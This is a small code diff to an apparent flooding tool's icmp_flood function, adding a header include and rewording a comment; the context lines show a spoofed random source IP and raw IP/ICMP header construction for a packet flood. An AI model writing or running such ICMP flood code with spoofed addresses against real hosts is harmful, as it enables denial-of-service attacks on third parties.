@@ -1,4 +1,5 @@
 #include "../../include/elcienco.h"
+#include "../../include/protocols.h"
 
 extern volatile int attack_running;
 
@@ -39,7 +40,7 @@ void *icmp_flood(void *arg) {
         char src_ip[16];
         random_ip(src_ip);
         
-        // Build ICMP Echo Request packet
+        // Pointers to packet sections
         struct ip_header *iph = (struct ip_header *)packet;
         struct icmp_header *icmph = (struct icmp_header *)(packet + sizeof(struct ip_header));
         
